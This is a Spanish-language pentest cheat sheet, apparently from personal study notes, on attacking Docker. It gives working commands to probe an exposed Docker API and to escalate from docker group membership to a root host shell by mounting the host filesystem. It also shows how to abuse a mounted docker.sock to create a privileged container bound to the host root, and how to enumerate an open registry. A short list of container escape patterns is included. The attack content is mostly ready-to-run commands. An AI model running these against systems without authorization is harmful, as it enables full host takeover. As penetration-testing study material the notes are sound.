---
aliases:
tags:
  - estado/completo
  - tool/docker
  - service/docker
kind: Tool
---
# docker

> [!info]
> Container runtime. En pentest: docker socket exposed = root host equivalente, escape de container, registry expuesto, secrets en imágenes.

***

## Recon

```bash
# Puerto 2375/tcp expuesto sin auth (peligroso)
curl http://<target>:2375/version
curl http://<target>:2375/containers/json

# Local: enum membership del grupo docker (= privesc trivial)
id | grep docker
```

***

## Membresía docker group → root

Usuario en grupo `docker` puede arrancar container con host fs montado:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# Ahora tenés shell como root en el host
```

***

## Docker socket exposed (CVE / misconfig)

```bash
# Si /var/run/docker.sock está bind-mounted en container exploitable
curl --unix-socket /var/run/docker.sock http://docker/containers/json

# Spawn privileged container vía API
curl -X POST --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"alpine","Cmd":["sh"],"HostConfig":{"Privileged":true,"Binds":["/:/host"]}}' \
  http://docker/containers/create
```

***

## Escape patterns

- **`--privileged` container** — cap_sys_admin → mount host fs
- **`cap_dac_read_search`, `cap_sys_module`** — capabilities sueltos
- **`/var/run/docker.sock` montado en container** — control de docker daemon
- **CVE-2019-5736** runc escape
- **Shared namespace** (`--net=host`, `--pid=host`, `--ipc=host`)

Ver tools: `deepce`, `cdk`, manual GTFOBins.

***

## Registry expuesto

```bash
# Listar repos
curl http://<target>:5000/v2/_catalog

# Listar tags
curl http://<target>:5000/v2/<repo>/tags/list

# Pull layer manifest → contiene info
curl http://<target>:5000/v2/<repo>/manifests/<tag>
```

***

## Notas Relacionadas

- [[Linux Privilege Escalation]]
- [[Linux PrivEsc - Abusing Sudoers]]
